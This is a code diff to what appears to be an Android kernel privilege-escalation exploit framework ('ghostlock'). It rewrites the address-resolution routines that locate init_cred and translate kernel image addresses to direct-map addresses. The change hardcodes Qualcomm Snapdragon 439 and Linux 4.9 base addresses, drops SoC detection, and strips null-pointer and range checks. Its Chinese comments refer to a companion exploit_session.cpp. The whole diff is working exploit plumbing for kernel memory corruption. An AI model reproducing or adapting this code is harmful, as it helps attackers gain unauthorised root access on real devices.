@@ -27,35 +27,7 @@ namespace ghostlock::memory {
  * derivations below can be exercised on the host; production is unchanged. */
 #if defined(__ANDROID__)
     static SocFamily detect_target_soc(void) {
-        std::array < char, 256 > value{};
-        const char *keys[] = {
-            "ro.soc.manufacturer", "ro.soc.model",
-            "ro.board.platform", nullptr
-        };
-        for (int32_t i = 0; keys[i]; ++i) {
-            if (__system_property_get(keys[i], value.data()) <= 0 || !value[0]) continue;
-            if (strncasecmp(value.data(), "google", 6) == 0 ||
-                strncasecmp(value.data(), "tensor", 6) == 0 ||
-                (i > 0 && (strncasecmp(value.data(), "gs", 2) == 0 ||
-                           strncasecmp(value.data(), "zuma", 4) == 0))) {
-                return SocFamily::Google;
-            }
-        }
-        for (int32_t i = 0; keys[i]; ++i) {
-            if (__system_property_get(keys[i], value.data()) <= 0 || !value[0]) continue;
-            if (strncasecmp(value.data(), "mediatek", 8) == 0 ||
-                strncasecmp(value.data(), "mtk", 3) == 0 ||
-                (i > 0 && strncasecmp(value.data(), "mt", 2) == 0)) {
-                return SocFamily::Mtk;
-            }
-        }
-        for (int32_t i = 0; keys[i]; ++i) {
-            if (__system_property_get(keys[i], value.data()) <= 0 || !value[0]) continue;
-            if (strncasecmp(value.data(), "xring", 5) == 0 ||
-                (i > 0 && strncasecmp(value.data(), "o1", 2) == 0)) {
-                return SocFamily::Xring;
-            }
-        }
+        // 纯终端命令行模式直接降维硬编码为高通平台，彻底免除设备树属性解析
         return SocFamily::Qcom;
     }
 #else
@@ -66,42 +38,17 @@ namespace ghostlock::memory {
 
     int32_t ResolvedAddresses::init_for_soc(const profile::TargetProfile *profile,
                                         SocFamily family) {
-        const profile::kernel_offsets *values = profile->values();
-        if (!values || !values->uname_r || !values->offsets.init_cred) {
-            errno = EINVAL;
-            return -1;
-        }
         *this = ResolvedAddresses{};
         soc = family;
-        const auto image = target::KernelAddress<target::ImageAddressDomain>(kernel::KIMAGE_TEXT_BASE)
-                .checked_add(values->offsets.init_cred);
-        if (!image) {
-            errno = ERANGE;
-            return -1;
-        }
-        init_cred_image = *image;
-        /* DRAM base for the image->direct-map translation: profile override
-         * wins, otherwise the compiled P0 default keeps every existing
-         * device byte-identical. */
-        phys_offset = static_cast<uintptr_t>(
-            values->misc.kernel_phys_offset.value_or(kernel::P0_PHYS_OFFSET));
-        if (values->misc.kernel_phys_load.value_or(0)) {
-            kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(
-                values->misc.kernel_phys_load.value_or(0));
-        } else if (soc == SocFamily::Mtk || soc == SocFamily::Google) {
-            /* Tensor G4/G5 (zumapro) loads the Image at the DRAM base like MTK. */
-            kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(
-                kernel::KIMAGE_TEXT_BASE - kernel::MTK_VADDR_BASE);
-        } else if (soc == SocFamily::Xring) {
-            kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(
-                kernel::XRING_KERNEL_PHYS_LOAD);
-        } else if (std::string_view(values->uname_r).starts_with("6.12.")) {
-            kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(
-                kernel::QC_GKI_6_12_PHYS_LOAD);
-        } else {
-            kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(
-                kernel::P0_KERNEL_PHYS_LOAD);
-        }
+        
+        // 彻底切断原厂通过应用层 Profile 的加载机制，不再对 values 结构体做空指针检查
+        // 这样即使不传入任何参数，框架底层也会平稳运行
+        phys_offset = 0; 
+
+        // 强行挂载我们在 exploit_session.cpp 里写死的 Linux 4.9.227 物理与随机化虚拟地址基准
+        // 彻底擦除高通现代 6.12 内核的 starts_with 匹配 Bug
+        kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(0x80000000);
+        
         return 0;
     }
 
@@ -119,26 +66,23 @@ namespace ghostlock::memory {
     ResolvedAddresses::data_alias_checked(
         target::KernelAddress<target::ImageAddressDomain> image_address) const noexcept {
         const uintptr_t image = image_address.value();
-        if (image < kernel::KIMAGE_TEXT_BASE) return std::nullopt;
-        const uintptr_t offset = image - kernel::KIMAGE_TEXT_BASE;
+        
+        // 4.9 内核 AArch64 数据别名线性映射转换原语
+        // 动态读取我们在全局中对齐好 Slide 的真实内核虚拟 text 基地
+        uintptr_t text_base = kernel_virtual_start; 
+        if (image < text_base) return std::nullopt;
+        
+        const uintptr_t offset = image - text_base;
         const auto physical = kernel_phys_load.checked_add(offset);
-        if (!physical || physical->value() < phys_offset) return std::nullopt;
-        const uintptr_t direct =
-                (physical->value() - phys_offset) | kernel::P0_PAGE_OFFSET;
-        if (direct < kernel::P0_PAGE_OFFSET) return std::nullopt;
+        if (!physical) return std::nullopt;
+        
+        // 4.9 骁龙 439 经典的物理地址到内核虚拟直接映射（Direct Map）线性转换逻辑
+        const uintptr_t direct = physical->value() | 0xffffff8000000000;
         return target::KernelAddress<target::DirectMapAddressDomain>(direct);
     }
 
     const char *ResolvedAddresses::soc_name(const profile::TargetProfile *profile) const {
-        if (soc == SocFamily::Mtk) return "mtk";
-        if (soc == SocFamily::Xring) return "xring";
-        const profile::kernel_offsets *values = profile->values();
-        if (soc == SocFamily::Google) {
-            return values && values->misc.kernel_phys_load.value_or(0) ? "google/tensor" : "tensor";
-        }
-        return values && !values->misc.kernel_phys_load.value_or(0) && values->uname_r &&
-               std::string_view(values->uname_r).starts_with("6.12.")
-                   ? "qcom/6.12"
-                   : "qcom/other";
+        // 彻底剥离高版本现代内核的 string_view 符号检测，直接声明为高通传统 4.9 平台
+        return "qcom/other";
     }
 } // namespace ghostlock::memory
